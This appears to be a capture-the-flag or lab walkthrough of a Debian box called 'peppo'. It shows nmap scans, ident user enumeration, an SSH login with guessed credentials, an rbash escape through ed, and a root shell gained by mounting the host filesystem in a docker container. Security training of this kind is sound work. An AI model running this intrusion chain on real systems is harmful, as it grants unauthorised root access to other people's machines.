## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.137.60

# HOSTNAME
peppo
# OPERATING SYSTEM
Debian GNU/Linux 9.12 (stretch)
# CREDENTIALS  
eleanor:eleanor
```
## OPEN PORTS DETAILS
```bash
22/tcp    open   ssh               syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
113/tcp   open   ident             syn-ack ttl 61 FreeBSD identd
5432/tcp  open   postgresql        syn-ack ttl 60 PostgreSQL DB 12.3 - 12.4
8080/tcp  open   http              syn-ack ttl 60 WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
10000/tcp open   snet-sensor-mgmt? syn-ack ttl 61
```
# ENUMERATION
## PORT 8080 - HTTP
```bash
- 8080/tcp  open   http              syn-ack ttl 60 WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
```
## PORT 5432 - POSTGRES SQL
```bash
- 5432/tcp  open   postgresql        syn-ack ttl 60 PostgreSQL DB 12.3 - 12.4

- Default creds works 
- postgres:postgres

```
## PORT 113 
```bash
# Nmap 
- 113/tcp   open   ident             syn-ack ttl 61 FreeBSD identd

# Enumeration tool
sudo apt install ident-user-enum -y 
- Usage identify usersnames with port numbers
sudo ident-user-enum $ip 22 113 5432 8080 10000
192.168.137.60:22       root
192.168.137.60:113      nobody
192.168.137.60:5432     <unknown>
192.168.137.60:8080     <unknown>
192.168.137.60:10000    eleanor

- Found username eleanor

```
## PORT 10000
```bash
- 10000/tcp open   snet-sensor-mgmt? syn-ack ttl 61

# Using Netcat
sudo nc -nvv $ip 10000                                    
(UNKNOWN) [192.168.137.60] 10000 (webmin) open

# User
auth-owners: eleanor

# curl 
sudo curl -s $url | html2text 
Hello World

```

## PORT 22 - SSH
```bash
# Nmap
- 22/tcp    open   ssh               syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)

# Trying found username as password - eleanor 
sudo ssh eleanor@$ip                          
[sudo] password for kali: 
The authenticity of host '192.168.137.60 (192.168.137.60)' can't be established.
ED25519 key fingerprint is SHA256:GrHKbhpl4waMainGkiieqFVD5jgXi12zVmCIya8UR7M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.137.60' (ED25519) to the list of known hosts.
eleanor@192.168.137.60's password: 
Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
eleanor@peppo:~$ id
-rbash: id: command not found
eleanor@peppo:~$
```

## INITIAL FOOTHOLD
```bash
- SSH user creds eleanor:eleanor

# Escape rbash - Reference https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e
eleanor@peppo:~$ echo $PATH                                                                                                                                                                  
/home/eleanor/bin                                                                                                                                                                            
eleanor@peppo:~$ export -p                                                                                                                                                                   
declare -x HOME="/home/eleanor"
declare -x LANG="en_US.UTF-8"   
declare -x LOGNAME="eleanor"
declare -x MAIL="/var/mail/eleanor"
declare -x OLDPWD
declare -rx PATH="/home/eleanor/bin"
declare -x PWD="/home/eleanor"
declare -rx SHELL="/bin/rbash"
declare -x SHLVL="1"
declare -x SSH_CLIENT="192.168.45.156 46620 22" 
declare -x SSH_CONNECTION="192.168.45.156 46620 192.168.137.60 22"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="tmux-256color"
declare -x USER="eleanor"
declare -x XDG_RUNTIME_DIR="/run/user/1000"
declare -x XDG_SESSION_ID="19"

- Command possible to use from path /home/eleanor/bin
eleanor@peppo:~$ ls -la /home/eleanor/bin
total 8
drwxr-xr-x 2 eleanor eleanor 4096 Jun  1  2020 .
drwxr-xr-x 4 eleanor eleanor 4096 Nov 26 11:39 ..
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chmod -> /bin/chmod
lrwxrwxrwx 1 root    root      10 Jun  1  2020 chown -> /bin/chown
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ed -> /bin/ed
lrwxrwxrwx 1 root    root       7 Jun  1  2020 ls -> /bin/ls
lrwxrwxrwx 1 root    root       7 Jun  1  2020 mv -> /bin/mv
lrwxrwxrwx 1 root    root       9 Jun  1  2020 ping -> /bin/ping
lrwxrwxrwx 1 root    root      10 Jun  1  2020 sleep -> /bin/sleep
lrwxrwxrwx 1 root    root      14 Jun  1  2020 touch -> /usr/bin/touch

- GTFOBINS - ed
eleanor@peppo:~$ ed
!/bin/sh
$ id
/bin/sh: 1: id: not found
$ /bin/bash
eleanor@peppo:~$ ls -la
total 32
drwxr-xr-x 4 eleanor eleanor 4096 Nov 26 11:39 .
drwxr-xr-x 3 root    root    4096 May 25  2020 ..
-rw------- 1 eleanor eleanor   97 Nov 26 11:39 .bash_history
-rw-r--r-- 1 eleanor eleanor   30 Jun  1  2020 .bashrc
drwxr-xr-x 2 eleanor eleanor 4096 Jun  1  2020 bin
drwxr-xr-x 2 root    root    4096 Jun  1  2020 helloworld
-rw-r--r-- 1 eleanor eleanor   33 Nov 26 10:46 local.txt
-rw-r--r-- 1 eleanor eleanor   30 Jun  1  2020 .profile
eleanor@peppo:~$ cat local.txt 
bash: cat: command not found
eleanor@peppo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp

eleanor@peppo:~$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
eleanor@peppo:~$ whoami
eleanor

- Now all commands works as the shell is bash
```
## PRIVILEGE ESCALATION
```bash
# Docker Privesc
- eleanor is a member of docker group
eleanor@peppo:~$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)

- Reference GTFOBINS
eleanor@peppo:/tmp$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        4 years ago         542MB
postgres            latest              adf2b126dda8        4 years ago         313MB

eleanor@peppo:/tmp$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Nov 26 21:45:46 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.137.60
Nmap scan report for 192.168.137.60
Host is up, received echo-reply ttl 61 (0.041s latency).
Scanned at 2024-11-26 21:45:48 IST for 154s
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE           REASON         VERSION
22/tcp    open   ssh               syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzklV3kD0MUV8hlgkTzmIXus0hs0kpUtsw944TP1RKcoGH+RVDKO3+X9tM0O5o4FWlq63/Rgu/MsM+MHhYJzR9SqhCwFN7FtcAumLaykQRuOTOUMWtRqNybqwTC1noDrh1I6zg/hmzNIOHBH7jVFX4hZ18puzP7kUEwLyzTL6gl8OekAnPGYQFNkLDLo1QuSHoPif+835rjirf6Z+AcVHtz+BCrJa+UvtCuDgQk6+hRvASZ/sZk21jTLqe+pc32a1yYnfySXJrfGevezVVeOzWca4Kbt8HcWz7nNmyS8vcr9U/sDD2ZvW0GEVgxneCDSha5zzAt3blNf8xgwaboetx
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBqNWmLnEEMpbdgBBhkcQQqjHi1mO1wl55JIWh4kpqzQYuZaKGZ63cIOppztFxsAowPqOEhImpkEni9fcTflquQ=
|   256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOEgaTq2swxYKGv8XDDrdarrUGFDnxl/3X18UjliCfL6

53/tcp    closed domain            reset ttl 61

113/tcp   open   ident             syn-ack ttl 61 FreeBSD identd
|_auth-owners: nobody

5432/tcp  open   postgresql        syn-ack ttl 60 PostgreSQL DB 12.3 - 12.4

8080/tcp  open   http              syn-ack ttl 60 WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-favicon: Unknown favicon MD5: D316E1622C58825727E7E4E6C954D289
|_http-title: Redmine
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
10000/tcp open   snet-sensor-mgmt? syn-ack ttl 61
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Tue, 26 Nov 2024 16:17:51 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Tue, 26 Nov 2024 16:17:45 GMT
|     Connection: close
|_    Hello World


1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.94SVN%I=7%D=11/26%Time=6745F4A8%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain
SF:\r\nDate:\x20Tue,\x2026\x20Nov\x202024\x2016:17:45\x20GMT\r\nConnection
SF::\x20close\r\n\r\nHello\x20World\n")%r(HTTPOptions,71,"HTTP/1\.1\x20200
SF:\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Tue,\x2026\x20Nov\x20
SF:2024\x2016:17:45\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\n
SF:")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusReq
SF:uestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(TLSSess
SF:ionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnectio
SF:n:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nConnection:\x20close\r\n\r\n")%r(X11Probe,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(FourOhFourRequest,7
SF:1,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Tu
SF:e,\x2026\x20Nov\x202024\x2016:17:51\x20GMT\r\nConnection:\x20close\r\n\
SF:r\nHello\x20World\n")%r(LPDString,2F,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LDAPBindReq,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(SIPOptions,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(LANDesk-RC,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(TerminalServer,2F,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 26 21:48:22 2024 -- 1 IP address (1 host up) scanned in 155.75 seconds

```

